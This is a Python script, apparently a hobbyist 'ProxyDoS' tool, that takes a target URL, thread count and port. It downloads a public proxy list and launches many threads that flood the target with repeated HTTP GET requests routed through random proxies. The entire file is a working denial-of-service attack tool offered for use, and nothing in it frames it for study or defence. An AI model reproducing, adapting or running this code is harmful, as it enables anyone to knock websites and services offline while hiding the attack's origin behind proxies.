import requests
import sys
import time
import random
import threading
from colorama import Fore

print(Fore.GREEN + """

   ___                    ___         
  / _ \_______ __ ____ __/ _ \___  ___
 / ___/ __/ _ \\ \ / // / // / _ \(_-<
/_/  /_/  \___/_\_\\_, /____/\___/___/
                  /___/               

""")
print(" ")

def opth():
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("root@bossy:~# Threads " + str(i+1)+ " Created ")
		time.sleep(0.01)
	print("root@bossy:~# Wait A Few Seconds For Threads Ready To Attack ...")
	time.sleep(3)
	input("root@bossy:~# Press Enter To Launch Attack !")
	global on
	on = True


on = False
def main():
	global pprr
	global list
	global proxy
	global url
	global pow
	global thr
	url = str(input(Fore.YELLOW + "root@bossy:~# Target : " + Fore.WHITE))
	thr = int(input(Fore.YELLOW + "root@bossy:~# Threads : " + Fore.WHITE))
	po = str(input(Fore.YELLOW + "root@bossy:~# Port : " + Fore.WHITE))
	cho = str(input(Fore.YELLOW + "root@bossy:~# Get Some Fresh Proxies ? ( y / n ) : " + Fore.WHITE))
	if cho =='y':
		if po =='80':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all') # Code By GogoZin
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "root@bossy:~# Sucess Download Proxies List !")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all') # Code By GogoZin
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "root@bossy:~# Sucess Download Https Proxies List !")
	else:
		pass
	list = str(input(Fore.YELLOW + "root@bossy:~# Proxies List (proxies.txt): " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.YELLOW + "Proxies Count : " + Fore.WHITE + "%d" %len(pprr))
	pow = int(input(Fore.YELLOW + "root@bossy:~# CC.Power ( 1-100 ) :" + Fore.WHITE))
	opth()
	
def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = requests.session()
	s.proxies = {}
	s.proxies['http'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
	s.proxies['https'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
	time.sleep(10)
	while True:
		while on:
			try:
				s.get(url)
				print(Fore.GREEN + "From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] " + Fore.GREEN + " Target-> " + Fore.WHITE + str(url)) #Code By GogoZin
				try:
					for y in range(pow):
						s.get(url)
						print(Fore.GREEN + "From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] " + "Target~> " + Fore.WHITE + str(url))
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "[!]Couldn't Connect To Proxy" + Fore.WHITE)


if __name__ == "__main__":
	main()
